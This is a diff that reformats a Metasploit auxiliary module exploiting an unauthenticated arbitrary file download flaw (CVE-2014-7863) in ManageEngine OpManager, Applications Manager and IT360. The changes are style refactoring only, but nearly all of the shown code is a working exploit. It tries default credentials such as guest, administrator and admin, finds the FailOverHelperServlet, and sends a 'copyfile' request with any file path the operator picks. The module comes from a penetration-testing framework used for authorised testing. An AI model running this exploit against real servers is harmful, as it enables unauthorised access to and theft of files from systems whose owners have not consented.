@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,38 +7,37 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => "ManageEngine Multiple Products Arbitrary File Download",
-      'Description'    => %q{
-        This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet
-        on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is
-        unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This
-        module will attempt to login using the default credentials for the administrator and
-        guest accounts; alternatively you can provide a pre-authenticated cookie or a username
-        and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually
-        8300). This module has been tested on both Windows and Linux with several different
-        versions. Windows paths have to be escaped with 4 backslashes on the command line. There is
-        a companion module that allows the recursive listing of any directory. This
-        vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.
-      },
-      'Author'       =>
-        [
-          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
-        ],
-      'License'     => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE', '2014-7863'],
-          ['OSVDB', '117695'],
-          ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/114'],
-          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt']
-        ],
-      'DisclosureDate' => 'Jan 28 2015'))
+                      'Name'           => "ManageEngine Multiple Products Arbitrary File Download",
+                      'Description'    => %q{
+                        This module exploits an arbitrary file download vulnerability in the FailOverHelperServlet
+                        on ManageEngine OpManager, Applications Manager and IT360. This vulnerability is
+                        unauthenticated on OpManager and Applications Manager, but authenticated in IT360. This
+                        module will attempt to login using the default credentials for the administrator and
+                        guest accounts; alternatively you can provide a pre-authenticated cookie or a username
+                        and password combo. For IT360 targets enter the RPORT of the OpManager instance (usually
+                        8300). This module has been tested on both Windows and Linux with several different
+                        versions. Windows paths have to be escaped with 4 backslashes on the command line. There is
+                        a companion module that allows the recursive listing of any directory. This
+                        vulnerability has been fixed in Applications Manager v11.9 b11912 and OpManager 11.6.
+                      },
+                      'Author' =>
+                        [
+                          'Pedro Ribeiro <pedrib[at]gmail.com>', # Vulnerability Discovery and Metasploit module
+                        ],
+                      'License' => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          ['CVE', '2014-7863'],
+                          ['OSVDB', '117695'],
+                          ['URL', 'http://seclists.org/fulldisclosure/2015/Jan/114'],
+                          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_failservlet.txt']
+                        ],
+                      'DisclosureDate' => 'Jan 28 2015'))
 
     register_options(
       [
@@ -48,79 +48,67 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),
         OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),
         OptString.new('DOMAIN_NAME', [false, 'Name of the domain to logon to (IT360 target only)'])
-      ], self.class)
+      ], self.class
+    )
   end
-
 
   def get_cookie
     cookie = nil
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(datastore['TARGETURI'])
-    })
+    res = send_request_cgi('method' => 'GET',
+                           'uri' => normalize_uri(datastore['TARGETURI']))
 
-    if res
-      cookie = res.get_cookies
-    end
+    cookie = res.get_cookies if res
 
     cookie
   end
 
   def detect_it360
-    res = send_request_cgi({
-      'uri'    => '/',
-      'method' => 'GET'
-    })
+    res = send_request_cgi('uri' => '/',
+                           'method' => 'GET')
 
-    if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
-      return true
-    end
+    return true if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
 
-    return false
+    false
   end
 
   def get_it360_cookie_name
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri('/')
-    })
+    res = send_request_cgi('method' => 'GET',
+                           'uri' => normalize_uri('/'))
 
     cookie = res.get_cookies
 
     if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
-      return $1
+      return Regexp.last_match(1)
     else
       return nil
     end
   end
 
   def authenticate_it360(port, path, username, password)
-    if datastore['DOMAIN_NAME'].nil?
-      vars_post = {
-        'LOGIN_ID' => username,
-        'PASSWORD' => password,
-        'isADEnabled' => 'false'
-      }
-    else
-      vars_post = {
-        'LOGIN_ID' => username,
-        'PASSWORD' => password,
-        'isADEnabled' => 'true',
-        'domainName' => datastore['DOMAIN_NAME']
-      }
-    end
+    vars_post = if datastore['DOMAIN_NAME'].nil?
+                  {
+                    'LOGIN_ID' => username,
+                    'PASSWORD' => password,
+                    'isADEnabled' => 'false'
+                  }
+                else
+                  {
+                    'LOGIN_ID' => username,
+                    'PASSWORD' => password,
+                    'isADEnabled' => 'true',
+                    'domainName' => datastore['DOMAIN_NAME']
+                  }
+                end
 
-    res = send_request_cgi({
-      'rport' => port,
-      'method' => 'POST',
-      'uri' => normalize_uri(path),
-      'vars_get' => {
-        'service' => 'OpManager',
-        'furl' => '/',
-        'timestamp' => Time.now.to_i
-      },
-      'vars_post' => vars_post
-      })
+    res = send_request_cgi('rport' => port,
+                           'method' => 'POST',
+                           'uri' => normalize_uri(path),
+                           'vars_get' => {
+                             'service' => 'OpManager',
+                             'furl' => '/',
+                             'timestamp' => Time.now.to_i
+                           },
+                           'vars_post' => vars_post)
 
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
       # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
@@ -139,10 +127,8 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # get the correct path, host and port
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri('/')
-    })
+    res = send_request_cgi('method' => 'GET',
+                           'uri' => normalize_uri('/'))
 
     if res && res.redirect?
       uri = [ res.redirection.port, res.redirection.path ]
@@ -153,9 +139,7 @@ class MetasploitModule < Msf::Auxiliary
     if datastore['USERNAME'] && datastore['PASSWORD']
       print_status("Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
       cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
-      unless cookie.nil?
-        return cookie
-      end
+      return cookie unless cookie.nil?
     end
 
     default_users = ['guest', 'administrator', 'admin']
@@ -163,9 +147,7 @@ class MetasploitModule < Msf::Auxiliary
     default_users.each do |user|
       print_status("Trying to authenticate as #{user}...")
       cookie = authenticate_it360(uri[0], uri[1], user, user)
-      unless cookie.nil?
-        return cookie
-      end
+      return cookie unless cookie.nil?
     end
 
     nil
@@ -190,27 +172,21 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     servlet = 'com.adventnet.me.opmanager.servlet.FailOverHelperServlet'
-    res = send_request_cgi({
-      'method' => 'GET',
-      'cookie' => cookie,
-      'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),
-    })
-    if res && res.code == 404
-      servlet = 'FailOverHelperServlet'
-    end
+    res = send_request_cgi('method' => 'GET',
+                           'cookie' => cookie,
+                           'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet))
+    servlet = 'FailOverHelperServlet' if res && res.code == 404
 
     # Create request
     begin
       print_status("Downloading file #{datastore['FILEPATH']}")
-      res = send_request_cgi({
-        'method' => 'POST',
-        'cookie' => cookie,
-        'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),
-        'vars_get' => {
-          'operation' => 'copyfile',
-          'fileName' => datastore['FILEPATH']
-        }
-      })
+      res = send_request_cgi('method' => 'POST',
+                             'cookie' => cookie,
+                             'uri' => normalize_uri(datastore['TARGETURI'], 'servlet', servlet),
+                             'vars_get' => {
+                               'operation' => 'copyfile',
+                               'fileName' => datastore['FILEPATH']
+                             })
     rescue Rex::ConnectionRefused
       print_error("Could not connect.")
       return
